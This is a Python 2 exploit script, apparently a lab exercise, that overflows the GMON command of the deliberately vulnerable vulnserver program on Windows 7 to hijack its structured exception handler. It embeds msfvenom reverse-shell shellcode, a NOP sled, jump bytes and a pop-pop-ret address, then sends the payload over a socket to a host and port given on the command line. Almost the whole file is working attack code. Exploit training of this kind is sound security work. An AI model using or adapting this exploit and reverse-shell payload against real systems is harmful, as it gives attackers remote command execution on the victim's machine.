#!/usr/bin/env python2

# This is an additional task 
# SEH Exploit for vulnserver (https://github.com/stephenbradshaw/vulnserver)
# Using Windows 7 SP1 (Developer Image from Microsoft - Win7IE8)

# The vulnerable function is the method "GMON /XXXXXXX"

import socket
import sys
import logging

# Offset calculated with mona pattern_create and mona pattern_offset
offset=3518

# shellcode created with
# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 exitfunc=thread -f python  -b '\x00' -v shellcode
shellcode =  b""
shellcode += b"\xdd\xc4\xd9\x74\x24\xf4\x58\xbd\xc3\xb3\xac"
shellcode += b"\xda\x33\xc9\xb1\x52\x83\xc0\x04\x31\x68\x13"
shellcode += b"\x03\xab\xa0\x4e\x2f\xd7\x2f\x0c\xd0\x27\xb0"
shellcode += b"\x71\x58\xc2\x81\xb1\x3e\x87\xb2\x01\x34\xc5"
shellcode += b"\x3e\xe9\x18\xfd\xb5\x9f\xb4\xf2\x7e\x15\xe3"
shellcode += b"\x3d\x7e\x06\xd7\x5c\xfc\x55\x04\xbe\x3d\x96"
shellcode += b"\x59\xbf\x7a\xcb\x90\xed\xd3\x87\x07\x01\x57"
shellcode += b"\xdd\x9b\xaa\x2b\xf3\x9b\x4f\xfb\xf2\x8a\xde"
shellcode += b"\x77\xad\x0c\xe1\x54\xc5\x04\xf9\xb9\xe0\xdf"
shellcode += b"\x72\x09\x9e\xe1\x52\x43\x5f\x4d\x9b\x6b\x92"
shellcode += b"\x8f\xdc\x4c\x4d\xfa\x14\xaf\xf0\xfd\xe3\xcd"
shellcode += b"\x2e\x8b\xf7\x76\xa4\x2b\xd3\x87\x69\xad\x90"
shellcode += b"\x84\xc6\xb9\xfe\x88\xd9\x6e\x75\xb4\x52\x91"
shellcode += b"\x59\x3c\x20\xb6\x7d\x64\xf2\xd7\x24\xc0\x55"
shellcode += b"\xe7\x36\xab\x0a\x4d\x3d\x46\x5e\xfc\x1c\x0f"
shellcode += b"\x93\xcd\x9e\xcf\xbb\x46\xed\xfd\x64\xfd\x79"
shellcode += b"\x4e\xec\xdb\x7e\xb1\xc7\x9c\x10\x4c\xe8\xdc"
shellcode += b"\x39\x8b\xbc\x8c\x51\x3a\xbd\x46\xa1\xc3\x68"
shellcode += b"\xc8\xf1\x6b\xc3\xa9\xa1\xcb\xb3\x41\xab\xc3"
shellcode += b"\xec\x72\xd4\x09\x85\x19\x2f\xda\xd5\xdd\x2f"
shellcode += b"\x1b\x42\xdc\x2f\x0e\x21\x69\xc9\x5a\x55\x3c"
shellcode += b"\x42\xf3\xcc\x65\x18\x62\x10\xb0\x65\xa4\x9a"
shellcode += b"\x37\x9a\x6b\x6b\x3d\x88\x1c\x9b\x08\xf2\x8b"
shellcode += b"\xa4\xa6\x9a\x50\x36\x2d\x5a\x1e\x2b\xfa\x0d"
shellcode += b"\x77\x9d\xf3\xdb\x65\x84\xad\xf9\x77\x50\x95"
shellcode += b"\xb9\xa3\xa1\x18\x40\x21\x9d\x3e\x52\xff\x1e"
shellcode += b"\x7b\x06\xaf\x48\xd5\xf0\x09\x23\x97\xaa\xc3"
shellcode += b"\x98\x71\x3a\x95\xd2\x41\x3c\x9a\x3e\x34\xa0"
shellcode += b"\x2b\x97\x01\xdf\x84\x7f\x86\x98\xf8\x1f\x69"
shellcode += b"\x73\xb9\x10\x20\xd9\xe8\xb8\xed\x88\xa8\xa4"
shellcode += b"\x0d\x67\xee\xd0\x8d\x8d\x8f\x26\x8d\xe4\x8a"
shellcode += b"\x63\x09\x15\xe7\xfc\xfc\x19\x54\xfc\xd4"

# Now Building the payload
buf = "GMON /"

# The shellcode must be before the SEH, so place [NOPs] + [SHELLCODE] + [SEH JMP] + [SEH POP]
buf += "\x90" * (offset - len (shellcode))

# Place the shellcode
buf += shellcode

# Jmp ahead of 6 bytes
buf += "\xeb\x06\x90\x90"

# Call pop pop ret (use mona seh -m essfunc.dll)
buf += "\x0b\x12\x50\x62"

# Some other nops
buf += "\x90"*40

# Now Jump back to the shellcode
# Jumps back 2000 bytes, enough to go somewhere in the nop before shellcode))

buf += "\xe9\x30\xF8\xFF\xFF"

# Fill the buffer up to 4000 bytes
buf += "B" *(4000-len(buf))

# Finally linefeed to send the buffer
buf += '\r\n'

if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)

# Receives the hello message
rec_data= s.recv(1024)
print rec_data

# Send payload
s.send(buf)

# Receive the reply (if any...)
rec_data= s.recv(1024)
print rec_data
